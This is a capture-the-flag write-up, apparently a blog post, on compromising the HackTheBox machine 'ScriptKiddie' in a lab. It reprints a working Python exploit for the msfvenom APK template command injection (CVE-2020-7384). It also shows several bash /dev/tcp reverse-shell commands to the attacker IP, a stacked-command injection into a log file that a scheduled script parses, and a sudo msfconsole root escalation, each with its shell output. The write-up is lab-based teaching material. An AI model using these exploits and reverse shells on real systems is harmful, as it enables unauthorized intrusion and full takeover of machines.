$ nmap -p- --min-rate <span class="m">1000</span> --reason -oA nmap/10-tcp-allport 10.10.10.226 
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-06-13 20:42 EDT
Nmap scan report <span class="k">for</span> 10.10.10.226
Host is up, received echo-reply ttl <span class="m">63</span> <span class="o">(</span>0.065s latency<span class="o">)</span>.
Not shown: <span class="m">65533</span> closed ports
Reason: <span class="m">65533</span> resets
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl <span class="m">63</span>
5000/tcp open  upnp    syn-ack ttl <span class="m">63</span>

Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 45.79 seconds
</code></pre></div><p>With default script scan, <code>nmap</code> identifies that port 5000 is actually a web application hosted using Python.</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «scriptkiddie» «10.10.14.31» 
$ nmap -p22,5000 -sC -sV -oA nmap/10-tcp-allport-script 10.10.10.226
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-06-13 20:44 EDT
Nmap scan report <span class="k">for</span> 10.10.10.226
Host is up <span class="o">(</span>0.056s latency<span class="o">)</span>.

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
5000/tcp open  http    Werkzeug httpd 0.16.1 <span class="o">(</span>Python 3.8.5<span class="o">)</span>
<span class="p">|</span>_http-server-header: Werkzeug/0.16.1 Python/3.8.5
<span class="p">|</span>_http-title: k1d<span class="err">&#39;</span><span class="m">5</span> h4ck3r t00l5
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 11.66 second
</code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-5000---website">TCP 5000 - Website</h3>
<p>The site provides several online hacking tools.</p>
<p><img class="img-container" src="imgs/image-20210614081410024.png" alt="image-20210614081410024"  />
</p>
<p>The <code>nmap</code> tool can be used to scan against itself.</p>
<p><img class="img-container" src="imgs/image-20210614081542603.png" alt="image-20210614081542603"  />
</p>
<p>The IP field doesn&rsquo;t accept others inputs except IPv4, so I don&rsquo;t thing it can be abused, but I&rsquo;ll note the <code>nmap</code> version.</p>
<p>The next tool is <code>msfvenom</code>, it can be used to generate a reverse shell binary.  It has three options on the OS: Windows, Linux and Android. There is also a template option, for example, you can embed your payload to Windows&rsquo;s <code>calc.exe</code>.</p>
<p><img class="img-container" src="imgs/image-20210614082411239.png" alt="image-20210614082411239"  />
</p>
<p>Somehow, it can only generate payload for Windows and Android.</p>
<p><img class="img-container" src="imgs/image-20210614082153746.png" alt="image-20210614082153746"  />
</p>
<p>The payload is available for 5 mins at <code>http://10.10.10.226:5000/static/payloads/[here]</code>.</p>
<p>The last tool is <code>searchsploit</code>, I tried to stack the commands but it returned this message.</p>
<p><img class="img-container" src="imgs/image-20210614083303308.png" alt="image-20210614083303308"  />
</p>
<h3 id="finding-tools-vulnerabilities">Finding Tools Vulnerabilities</h3>
<p>I can&rsquo;t get the tools version except for <code>nmap</code>, so I searched some exploits around before the box release date (February 2021) on Exploit-DB  and here is what I found.</p>
<p><img class="img-container" src="imgs/image-20210614084800963.png" alt="image-20210614084800963"  />
</p>
<p>And that is probably what I need.</p>
<p>I typed &ldquo;msfvenom&rdquo; on the site too, and the exploit also appeared there.</p>
<p><img class="img-container" src="imgs/image-20210614085320477.png" alt="image-20210614085320477"  />
</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-kid">Shell as kid</h3>
<h4 id="mfvenom-cve-2020-7384">Mfvenom CVE-2020-7384</h4>
<p>I&rsquo;ll use <a href="https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md">this exploit</a>, but I&rsquo;ll change the payload and the template location to my current working directory.</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python3</span>
<span class="kn">import</span> <span class="nn">subprocess</span>
<span class="kn">import</span> <span class="nn">tempfile</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b32encode</span>

<span class="c1"># Change me</span>
<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/10.10.14.31/9000 0&gt;&amp;1&#34;&#39;</span>

<span class="c1"># b32encode to avoid badchars (keytool is picky)</span>
<span class="c1"># thanks to @fdellwing for noticing that base64 can sometimes break keytool</span>
<span class="c1"># &lt;https://github.com/justinsteven/advisories/issues/2&gt;</span>
<span class="n">payload_b32</span> <span class="o">=</span> <span class="n">b32encode</span><span class="p">(</span><span class="n">payload</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
<span class="n">dname</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;CN=&#39;|echo </span><span class="si">{</span><span class="n">payload_b32</span><span class="si">}</span><span class="s2"> | base32 -d | sh #&#34;</span>

<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] Manufacturing evil apkfile&#34;</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Payload: </span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;-dname: </span><span class="si">{</span><span class="n">dname</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
<span class="nb">print</span><span class="p">()</span>

<span class="n">tmpdir</span> <span class="o">=</span> <span class="s2">&#34;./&#34;</span>
<span class="n">apk_file</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">tmpdir</span><span class="p">,</span> <span class="s2">&#34;evil.apk&#34;</span><span class="p">)</span>
<span class="n">empty_file</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">tmpdir</span><span class="p">,</span> <span class="s2">&#34;empty&#34;</span><span class="p">)</span>
<span class="n">keystore_file</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">tmpdir</span><span class="p">,</span> <span class="s2">&#34;signing.keystore&#34;</span><span class="p">)</span>
<span class="n">storepass</span> <span class="o">=</span> <span class="n">keypass</span> <span class="o">=</span> <span class="s2">&#34;password&#34;</span>
<span class="n">key_alias</span> <span class="o">=</span> <span class="s2">&#34;signing.key&#34;</span>
<span class="nb">open</span><span class="p">(</span><span class="n">empty_file</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
<span class="n">subprocess</span><span class="o">.</span><span class="n">check_call</span><span class="p">([</span><span class="s2">&#34;zip&#34;</span><span class="p">,</span> <span class="s2">&#34;-j&#34;</span><span class="p">,</span> <span class="n">apk_file</span><span class="p">,</span> <span class="n">empty_file</span><span class="p">])</span>

<span class="n">subprocess</span><span class="o">.</span><span class="n">check_call</span><span class="p">([</span><span class="s2">&#34;keytool&#34;</span><span class="p">,</span> <span class="s2">&#34;-genkey&#34;</span><span class="p">,</span> <span class="s2">&#34;-keystore&#34;</span><span class="p">,</span> <span class="n">keystore_file</span><span class="p">,</span> <span class="s2">&#34;-alias&#34;</span><span class="p">,</span> <span class="n">key_alias</span><span class="p">,</span> <span class="s2">&#34;-storepass&#34;</span><span class="p">,</span> <span class="n">storepass</span><span class="p">,</span>
                       <span class="s2">&#34;-keypass&#34;</span><span class="p">,</span> <span class="n">keypass</span><span class="p">,</span> <span class="s2">&#34;-keyalg&#34;</span><span class="p">,</span> <span class="s2">&#34;RSA&#34;</span><span class="p">,</span> <span class="s2">&#34;-keysize&#34;</span><span class="p">,</span> <span class="s2">&#34;2048&#34;</span><span class="p">,</span> <span class="s2">&#34;-dname&#34;</span><span class="p">,</span> <span class="n">dname</span><span class="p">])</span>
<span class="n">subprocess</span><span class="o">.</span><span class="n">check_call</span><span class="p">([</span><span class="s2">&#34;jarsigner&#34;</span><span class="p">,</span> <span class="s2">&#34;-sigalg&#34;</span><span class="p">,</span> <span class="s2">&#34;SHA1withRSA&#34;</span><span class="p">,</span> <span class="s2">&#34;-digestalg&#34;</span><span class="p">,</span> <span class="s2">&#34;SHA1&#34;</span><span class="p">,</span> <span class="s2">&#34;-keystore&#34;</span><span class="p">,</span> <span class="n">keystore_file</span><span class="p">,</span>
                       <span class="s2">&#34;-storepass&#34;</span><span class="p">,</span> <span class="n">storepass</span><span class="p">,</span> <span class="s2">&#34;-keypass&#34;</span><span class="p">,</span> <span class="n">keypass</span><span class="p">,</span> <span class="n">apk_file</span><span class="p">,</span> <span class="n">key_alias</span><span class="p">])</span>
<span class="nb">print</span><span class="p">()</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] Done! apkfile is at </span><span class="si">{</span><span class="n">apk_file</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Do: msfvenom -x </span><span class="si">{</span><span class="n">apk_file</span><span class="si">}</span><span class="s2"> -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null&#34;</span><span class="p">)</span>
</code></pre></div><p>It produces a file called <code>evil.apk</code> and it also shows the exploit commands.</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.31»
$ python3 exploit_msfvenom.py
<span class="o">[</span>+<span class="o">]</span> Manufacturing evil apkfile
Payload: bash -c <span class="s2">&#34;bash -i &gt;&amp; /dev/tcp/10.10.14.31/9000 0&gt;&amp;1&#34;</span>
-dname: <span class="nv">CN</span><span class="o">=</span><span class="s1">&#39;|echo MJQXG2BAFVRSAITCMFZWQIBNNEQD4JRAF5SGK5RPORRXALZRGAXDCMBOGE2C4MZRF44TAMBQEAYD4JRREI====== | base32 -d | sh #
</span><span class="s1">
</span><span class="s1">  adding: empty (stored 0%)
</span><span class="s1">jar signed.
</span><span class="s1">
</span><span class="s1">Warning:
</span><span class="s1">The signer&#39;</span>s certificate is self-signed.

<span class="o">[</span>+<span class="o">]</span> Done! apkfile is at ./evil.apk
Do: msfvenom -x ./evil.apk -p android/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>127.0.0.1 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -o /dev/null
</code></pre></div><h4 id="reverse-shell---kid">Reverse shell - kid</h4>
<p>I&rsquo;ll setup a <code>nc</code> listener on port 9000, then I&rsquo;ll upload the <code>evil.apk</code> file as the template file and then I&rsquo;ll click on the generate button.</p>
<p><img class="img-container" src="imgs/image-20210614103158432.png" alt="image-20210614103158432"  />
</p>
<p>On my listener, I&rsquo;ve a shell now as user <code>kid</code>.</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"> root@kali «exploits» «10.10.14.31» 
$ nc -nvlp <span class="m">9000</span>
listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9000</span> ...
connect to <span class="o">[</span>10.10.14.31<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.226<span class="o">]</span> <span class="m">34230</span>
bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>897<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
bash: no job control in this shell
kid@scriptkiddie:~/html$    
</code></pre></div><p><img class="img-container" src="imgs/image-20210614102941088.png" alt="image-20210614102941088"  />
</p>
<h4 id="shell-upgrade">Shell upgrade</h4>
<p>I&rsquo;ll upgrade my shell first.</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.31» 
$ nc -nvlp <span class="m">9000</span>
listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9000</span> ...
connect to <span class="o">[</span>10.10.14.31<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.226<span class="o">]</span> <span class="m">34230</span>
bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>897<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
bash: no job control in this shell
kid@scriptkiddie:~/html$ id
<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>kid<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>kid<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>kid<span class="o">)</span>
kid@scriptkiddie:~/html$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
<span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
kid@scriptkiddie:~/html$ which python
which python
kid@scriptkiddie:~/html$ python3 -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
python3 -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
kid@scriptkiddie:~/html$ ^Z
<span class="o">[</span>1<span class="o">]</span>  + <span class="m">10652</span> suspended  nc -nvlp <span class="m">9000</span>
→ root@kali «exploits» «10.10.14.31» 
$ stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
<span class="o">[</span>1<span class="o">]</span>  + <span class="m">10652</span> continued  nc -nvlp <span class="m">9000</span>

kid@scriptkiddie:~/html$ 
</code></pre></div><p>User flag is done here.</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">kid@scriptkiddie:~/html$ <span class="nb">cd</span> ~
kid@scriptkiddie:~$ ls -la
total <span class="m">60</span>
...&lt;SNIP&gt;...
-rw-r--r--  <span class="m">1</span> kid  kid   <span class="m">807</span> Feb <span class="m">25</span>  <span class="m">2020</span> .profile
drwx------  <span class="m">2</span> kid  kid  <span class="m">4096</span> Feb <span class="m">10</span> 16:11 .ssh
-rw-r--r--  <span class="m">1</span> kid  kid     <span class="m">0</span> Jan  <span class="m">5</span> 11:10 .sudo_as_admin_successful
drwxrwxr-x  <span class="m">5</span> kid  kid  <span class="m">4096</span> Feb  <span class="m">3</span> 11:03 html
drwxrwxrwx  <span class="m">2</span> kid  kid  <span class="m">4096</span> Feb  <span class="m">3</span> 07:40 logs
drwxr-xr-x  <span class="m">3</span> kid  kid  <span class="m">4096</span> Feb  <span class="m">3</span> 11:48 snap
-r--------  <span class="m">1</span> kid  kid    <span class="m">33</span> Jun <span class="m">12</span> 11:35 user.txt
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-pwn">Shell as pwn</h3>
<h4 id="internal-enumeration">Internal Enumeration</h4>
<p>On kid&rsquo;s home, there&rsquo;s a folder called <code>logs</code>. The <code>logs</code> folder contains one file called <code>hackers</code>, but the content is empty.</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">kid@scriptkiddie:~/logs$ ls -la
total <span class="m">8</span>
drwxrwxrwx  <span class="m">2</span> kid kid <span class="m">4096</span> Feb  <span class="m">3</span> 07:40 .
drwxr-xr-x <span class="m">11</span> kid kid <span class="m">4096</span> Feb  <span class="m">3</span> 11:49 ..
-rw-rw-r--  <span class="m">1</span> kid pwn    <span class="m">0</span> Jun <span class="m">14</span> 01:40 hackers
</code></pre></div><p>I did a quick check on the available users who have shells.  It looks like I need to escalate to <code>pwn</code>.</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">kid@scriptkiddie:~$ cat /etc/passwd <span class="p">|</span> grep sh$
root:x:0:0:root:/root:/bin/bash
kid:x:1000:1000:kid:/home/kid:/bin/bash
pwn:x:1001:1001::/home/pwn:/bin/bash
</code></pre></div><p>Searching files owned by user <code>pwn</code> discovers one script called <code>scanlosers.sh</code>.</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">kid@scriptkiddie:~$ find / -type f -user pwn 2&gt;/dev/null
/home/pwn/.bash_logout
/home/pwn/.selected_editor
/home/pwn/.bashrc
/home/pwn/.profile
/home/pwn/scanlosers.sh
</code></pre></div><p>The script is writable by me.</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">kid@scriptkiddie:~$ ls -l /home/pwn/scanlosers.sh
-rwxrwxr-- <span class="m">1</span> pwn pwn <span class="m">250</span> Jan <span class="m">28</span> 17:57 /home/pwn/scanlosers.sh
</code></pre></div><h4 id="script-analysis">Script analysis</h4>
<p>The script is most likely linked with kid&rsquo;s hack tools website and probably can be abused with stacked command, but I need to find how the log in <code>hackers</code> file is formatted.</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">kid@scriptkiddie:~$ cat /home/pwn/scanlosers.sh
<span class="c1">#!/bin/bash</span>

<span class="c1"># &lt;== Define log</span>
<span class="nv">log</span><span class="o">=</span>/home/kid/logs/hackers 

<span class="nb">cd</span> /home/pwn/
cat <span class="nv">$log</span> <span class="p">|</span> cut -d<span class="s1">&#39; &#39;</span> -f3- <span class="p">|</span> sort -u <span class="p">|</span> <span class="k">while</span> <span class="nb">read</span> ip<span class="p">;</span> <span class="k">do</span>
    sh -c <span class="s2">&#34;nmap --top-ports 10 -oN recon/</span><span class="si">${</span><span class="nv">ip</span><span class="si">}</span><span class="s2">.nmap </span><span class="si">${</span><span class="nv">ip</span><span class="si">}</span><span class="s2"> 2&gt;&amp;1 &gt;/dev/null&#34;</span> <span class="p">&amp;</span>
<span class="k">done</span>
<span class="c1"># &lt;== The log is cleared immediately</span>
<span class="k">if</span> <span class="o">[[</span> <span class="k">$(</span>wc -l &lt; <span class="nv">$log</span><span class="k">)</span> -gt <span class="m">0</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span> <span class="nb">echo</span> -n &gt; <span class="nv">$log</span><span class="p">;</span> <span class="k">fi</span>
</code></pre></div><p>Looking back into the web source code, I find how the log is formatted in a function called <code>searchsploit</code>. Inserting malicious input on the kid&rsquo;s hack tools will trigger the else condition on this function, which logs date and IP.</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="o">...&lt;</span><span class="n">SNIP</span><span class="o">&gt;...</span>
<span class="k">def</span> <span class="nf">searchsploit</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">srcip</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">regex_alphanum</span><span class="o">.</span><span class="n">match</span><span class="p">(</span><span class="n">text</span><span class="p">):</span>
        <span class="n">result</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">([</span><span class="s1">&#39;searchsploit&#39;</span><span class="p">,</span> <span class="s1">&#39;--color&#39;</span><span class="p">,</span> <span class="n">text</span><span class="p">])</span>
        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;index.html&#39;</span><span class="p">,</span> <span class="n">searchsploit</span><span class="o">=</span><span class="n">result</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;UTF-8&#39;</span><span class="p">,</span> <span class="s1">&#39;ignore&#39;</span><span class="p">))</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;/home/kid/logs/hackers&#39;</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;[</span><span class="si">{</span><span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">()</span><span class="si">}</span><span class="s1">] </span><span class="si">{</span><span class="n">srcip</span><span class="si">}</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;index.html&#39;</span><span class="p">,</span> <span class="n">sserror</span><span class="o">=</span><span class="s2">&#34;stop hacking me - well hack you back&#34;</span><span class="p">)</span>
<span class="o">...&lt;</span><span class="n">SNIP</span><span class="o">&gt;...</span>
</code></pre></div><p>I can trigger an event that logs my IP in the <code>hackers</code> file but then the logs is cleared so fast that I couldn&rsquo;t catch it with the <code>watch</code> command.</p>
<p><img class="img-container" src="imgs/image-20210614114025066.png" alt="image-20210614114025066"  />
</p>
<p>But with this, I could guess that this script is intended as a &lsquo;counter attack&rsquo;. From here, I know that <code>scanlosers.sh</code> is <strong>executed automatically</strong> after a malicious attempt is performed on the site.</p>
<p>I could generate the same log format in one line:</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.31»
$ python3 -c <span class="s2">&#34;from datetime import datetime; print(f&#39;[{datetime.now()}] 127.0.0.1&#39;)&#34;</span>
<span class="o">[</span>2021-06-14 00:43:54.924946<span class="o">]</span> 127.0.0.1
</code></pre></div><p>To exploit the script, I have to trick this line from <code>scanlosers.sh</code></p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="nb">echo</span> <span class="nv">$log</span> <span class="p">|</span> cut -d<span class="s1">&#39; &#39;</span> -f3- <span class="p">|</span> sort -u
</code></pre></div><p>What that line does is it extracts the IP address from the log.</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.31»
$ <span class="nv">log</span><span class="o">=</span><span class="s1">&#39;[2021-06-14 00:28:09.560444] 127.0.0.1&#39;</span>
→ root@kali «exploits» «10.10.14.31»
$ <span class="nb">echo</span> <span class="nv">$log</span> <span class="p">|</span> cut -d<span class="s1">&#39; &#39;</span> -f3- <span class="p">|</span> sort -u
127.0.0.1
</code></pre></div><p>From here, I&rsquo;ll just add a semi-colon and a space before putting my reverse shell.</p>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">[2021-06-14 00:28:09.560444] 127.0.0.1; bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.30/9000 0&gt;&amp;1&#39;;
</code></pre></div><p>It becomes a stacked command.</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.31»
$ <span class="nb">echo</span> <span class="s2">&#34;[2021-06-14 00:28:09.560444] 127.0.0.1; bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.30/9000 0&gt;&amp;1&#39;;&#34;</span> <span class="p">|</span> cut -d<span class="s1">&#39; &#39;</span> -f3- <span class="p">|</span> sort -u
127.0.0.1<span class="p">;</span> bash -c <span class="s1">&#39;bash -i &gt;&amp; /dev/tcp/10.10.14.30/9000 0&gt;&amp;1&#39;</span><span class="p">;</span>
</code></pre></div><p>If I map that format to this line:</p>
<pre><code>sh -c &quot;nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2&gt;&amp;1 &gt;/dev/null&quot;
</code></pre><p>It turns into this:</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">sh -c <span class="s2">&#34;nmap --top-ports 10 -oN recon/127.0.0.1; bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.30/9000 0&gt;&amp;1&#39;;.nmap 127.0.0.1; bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.30/9000 0&gt;&amp;1&#39;; 2&gt;&amp;1 &gt;/dev/null&#34;</span>
</code></pre></div><h4 id="exploitation">Exploitation</h4>
<p>Since the logs is cleared automatically, I&rsquo;ll use while loop to keep inserting my malicious log to the <code>hackers</code> file and setup my listener on port 9001.</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">kid@scriptkiddie:~/logs$ <span class="k">while</span> sleep 0.1<span class="p">;</span> <span class="k">do</span> <span class="nb">echo</span> <span class="s2">&#34;[2021-06-14 00:28:09.560444] 127.0.0.1; bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.31/9001 0&gt;&amp;1&#39;;&#34;</span> &gt; hackers<span class="p">;</span> <span class="k">done</span>
</code></pre></div><p>On my listener:</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">→ root@kali «scriptkiddie» «10.10.14.31» 
$ nc -nvlp <span class="m">9001</span>             
listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9001</span> ...
connect to <span class="o">[</span>10.10.14.31<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.226<span class="o">]</span> <span class="m">33110</span>
bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>868<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
bash: no job control in this shell
pwn@scriptkiddie:~$ id
id
<span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>pwn<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>pwn<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>pwn<span class="o">)</span>
</code></pre></div><p><img class="img-container" src="imgs/image-20210614115903137.png" alt="image-20210614115903137"  />
</p>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="sudo---msfconsole">Sudo - msfconsole</h4>
<p>User <code>pwn</code> has sudo privileges on <code>msfconsole</code>.</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">pwn@scriptkiddie:~$ sudo -l
sudo -l
Matching Defaults entries <span class="k">for</span> pwn on scriptkiddie:
    env_reset, mail_badpass,
    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User pwn may run the following commands on scriptkiddie:
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
</code></pre></div><p>To exploit this I could just send a reverse shell using  <code>-x</code> options and then I&rsquo;ll wait on my <code>nc</code> listener.</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">pwn@scriptkiddie:~$ sudo msfconsole -q -x <span class="s1">&#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/10.10.14.31/9005 0&gt;&amp;1&#34;&#39;</span>
</code></pre></div><p>And I&rsquo;m rooted</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «scriptkiddie» «10.10.14.31» 
$ rlwrap nc -nvlp <span class="m">9005</span>
listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9005</span> ...
connect to <span class="o">[</span>10.10.14.31<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.226<span class="o">]</span> <span class="m">43512</span>
bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>868<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
bash: no job control in this shell
root@scriptkiddie:/home/pwn# id
id
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
root@scriptkiddie:/home/pwn# cut -c-15 /root/root.txt
cut -c-15 /root/root.txt
bf7edd4c58e4420
</code></pre></div><p><img class="img-container" src="imgs/image-20210614121311990.png" alt="image-20210614121311990"  />
</p>
<h2 id="references">References</h2>
<ul>
<li><a href="https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md">https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md</a></li>
<li><a href="https://www.rapid7.com/db/modules/exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection/">https://www.rapid7.com/db/modules/exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection/</a></li>
<li><a href="https://discuss.getsol.us/d/4656-java-command-unknown-after-update/3">https://discuss.getsol.us/d/4656-java-command-unknown-after-update/3</a></li>
<li><a href="http://www.citrucoop.es/jdk-11.0.6/bin/">http://www.citrucoop.es/jdk-11.0.6/bin/</a></li>
</ul>
]]></content:encoded>
    </item>
    
  </channel>
</rss>
